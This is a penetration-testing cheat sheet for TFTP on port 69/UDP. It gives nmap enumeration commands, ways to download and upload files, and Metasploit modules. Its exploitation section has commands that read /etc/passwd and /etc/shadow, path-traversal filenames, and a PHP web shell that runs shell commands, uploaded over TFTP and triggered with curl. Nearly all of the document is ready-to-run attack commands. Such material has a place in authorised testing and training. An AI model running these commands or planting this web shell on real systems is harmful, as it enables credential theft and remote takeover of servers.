# Port 69/UDP - TFTP

## Table of Contents
- [Enumeration](#enumeration)
- [File Transfer](#file-transfer)
- [Exploitation](#exploitation)

---

## Enumeration

### Quick Check (One-liner)

```shell
nmap -sU -p 69 --script "tftp-enum" $rhost && tftp $rhost -c get /etc/passwd 2>/dev/null
```

### Nmap

```shell
nmap -sU -p 69 $rhost
nmap -sU -p 69 --script "tftp-enum" $rhost
nmap -sU -p 69 --script "tftp-version" $rhost
```

### Check Service

```shell
# Using tftp client
tftp $rhost
status
quit
```

---

## File Transfer

### Download Files

```shell
# Interactive mode
tftp $rhost
get /etc/passwd
quit

# One-liner
tftp $rhost -c get filename

# atftp
atftp -g -r filename $rhost
```

### Upload Files

```shell
# Interactive mode
tftp $rhost
put shell.php
quit

# One-liner
tftp $rhost -c put localfile remotefile

# atftp
atftp -p -l localfile -r remotefile $rhost
```

### Common Files to Try

```shell
# Cisco configs
tftp $rhost -c get running-config
tftp $rhost -c get startup-config

# System files
tftp $rhost -c get /etc/passwd
tftp $rhost -c get /etc/shadow
```

---

## Exploitation

### Directory Traversal

```shell
# Try path traversal
tftp $rhost
get ../../../etc/passwd
get /../../../etc/passwd
```

### Metasploit

```shell
# TFTP Directory Traversal
use auxiliary/admin/tftp/tftp_transfer_util
set RHOST $rhost
set ACTION DOWNLOAD
set FILENAME ../../../etc/passwd
run

# Enumerate files
use auxiliary/scanner/tftp/tftpbrute
set RHOSTS $rhost
run
```

### Upload Web Shell

```shell
# If TFTP root is web-accessible
echo '<?php system($_GET["cmd"]); ?>' > shell.php
tftp $rhost -c put shell.php

# Access
curl "http://$rhost/shell.php?cmd=id"
```

---

## Quick Reference

| Command | Description |
| :--- | :--- |
| `tftp $rhost` | Connect to TFTP |
| `get filename` | Download file |
| `put filename` | Upload file |
| `atftp -g -r file $rhost` | Download with atftp |
| `atftp -p -l local -r remote $rhost` | Upload with atftp |
